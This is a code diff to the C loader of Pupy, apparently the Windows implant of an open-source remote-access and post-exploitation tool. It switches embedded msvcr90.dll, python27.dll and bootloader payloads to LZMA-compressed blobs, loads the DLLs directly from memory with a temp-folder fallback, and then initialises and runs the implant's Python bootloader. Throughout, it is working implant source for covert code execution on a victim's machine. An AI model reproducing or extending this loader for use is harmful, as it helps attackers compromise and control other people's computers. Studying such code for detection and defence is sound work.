@@ -3,10 +3,6 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
-#ifndef DEBUG
-#define QUIET // uncomment to avoid debug prints
-#endif
-
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -16,14 +12,15 @@
 #include "actctx.h"
 #include "resource_python_manifest.c"
 #include "base_inject.h"
+#include "debug.h"
 
-extern const char resources_python27_dll_start[];
-extern const int resources_python27_dll_size;
-extern const char resources_bootloader_pyc_start[];
-extern const int resources_bootloader_pyc_size;
-extern const char resources_msvcr90_dll_start[];
-extern const int resources_msvcr90_dll_size;
-extern const char resource_python_manifest[];
+#include "msvcr90.c"
+#include "python27.c"
+#include "bootloader.c"
+
+#include "lzmaunpack.c"
+
+#include "revision.h"
 
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
@@ -52,16 +49,22 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	ULONG_PTR cookie = 0;
 	PyGILState_STATE restore_state;
 
-	if(!GetModuleHandle("msvcr90.dll")){
-		int r = _load_msvcr90(resources_msvcr90_dll_start);
-		#ifndef QUIET
-		fprintf(stderr,"loading msvcr90.dll: %d\n", r);
-		#endif
+	dfprint(stderr, "TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
+
+	if(!GetModuleHandle("msvcr90.dll")) {
+		void *msvcr90 = lzmaunpack(
+			msvcr90_c_start,
+			msvcr90_c_size,
+			NULL
+		);
+
+		int r = _load_msvcr90(msvcr90);
+		lzmafree(msvcr90);
+
+		dfprint(stderr,"loading msvcr90.dll: %d\n", r);
 	}
 	else{
-		#ifndef QUIET
-		fprintf(stderr,"msvcr90.dll already loaded\n");
-		#endif
+		dfprint(stderr,"msvcr90.dll already loaded\n");
 	}
 
 	GetTempPath(MAX_PATH, tmp_path);
@@ -72,44 +75,35 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 		int res=0;
 		if(GetModuleHandle("python27.dll")){
 			HANDLE hp;
-			#ifndef QUIET
-			fprintf(stderr,"python27.dll is already loaded\n");
-			#endif
+			dfprint(stderr,"python27.dll is already loaded\n");
 			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
 		}
 		else{
-			if(!_load_python("python27.dll", resources_python27_dll_start)){
-				#ifndef QUIET
-				fprintf(stderr,"loading python27.dll from memory failed\n");
-				#endif
+			void *python27 = lzmaunpack(python27_c_start, python27_c_size, NULL);
+			int res = _load_python("python27.dll", python27);
+			lzmafree(python27);
+			if(!res) {
+				dfprint(stderr,"loading python27.dll from memory failed\n");
 
 				//if loading from memory fail, we write dll on disk
 				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);
 
 				f=fopen(tmp_python_dll_path,"wb");
-				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
+				res=fwrite(python27_c_start, sizeof(char), python27_c_size, f);
 				fclose(f);
 
 				if(!_load_python(tmp_python_dll_path, NULL)){
 					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
-						#ifndef QUIET
-						fprintf(stderr,"could not load python dll\n");
-						#endif
+						dfprint(stderr,"could not load python dll\n");
 					}
 				}
 			}
-		#ifndef QUIET
-		fprintf(stderr,"python interpreter loaded\n");
-		#endif
+		dfprint(stderr,"python interpreter loaded\n");
 		}
 	}
-	#ifndef QUIET
-	fprintf(stderr,"calling PyEval_InitThreads() ...\n");
-	#endif
+	dfprint(stderr,"calling PyEval_InitThreads() ...\n");
 	PyEval_InitThreads();
-	#ifndef QUIET
-	fprintf(stderr,"PyEval_InitThreads() called\n");
-	#endif
+	dfprint(stderr,"PyEval_InitThreads() called\n");
 	if(!Py_IsInitialized()){
 		ppath = Py_GetPath();
 		strcpy(ppath, "\x00");
@@ -118,31 +112,24 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 		Py_NoSiteFlag = 1; /* remove site.py auto import */
 		Py_Initialize();
 
-		#ifndef QUIET
-		fprintf(stderr,"Py_Initialize()\n");
-		#endif
+		dfprint(stderr,"Py_Initialize()\n");
 		PySys_SetObject("frozen", PyBool_FromLong(1));
 	}
 	restore_state=PyGILState_Ensure();
 
 	init_memimporter();
-	#ifndef QUIET
-	fprintf(stderr,"init_memimporter()\n");
-	#endif
+	dfprint(stderr,"init_memimporter()\n");
 	initpupy();
-	#ifndef QUIET
-	fprintf(stderr,"initpupy()\n");
-	#endif
-
-
+	dfprint(stderr,"initpupy()\n");
 
 	/* We execute then in the context of '__main__' */
-	#ifndef QUIET
-	fprintf(stderr,"starting evaluating python code ...\n");
-	#endif
+	dfprint(stderr,"starting evaluating python code ...\n");
 	m = PyImport_AddModule("__main__");
 	if (m) d = PyModule_GetDict(m);
-	if (d) seq = PyMarshal_ReadObjectFromString(resources_bootloader_pyc_start, resources_bootloader_pyc_size);
+	if (d) seq = PyObject_lzmaunpack(
+		bootloader_c_start,
+		bootloader_c_size
+	);
 	if (seq) {
 		Py_ssize_t i, max = PySequence_Length(seq);
 		for (i=0;i<max;i++) {
@@ -152,6 +139,7 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 				if (!discard) {
 					PyErr_Print();
 					rc = 255;
+					break;
 				}
 				Py_XDECREF(discard);
 				/* keep going even if we fail */
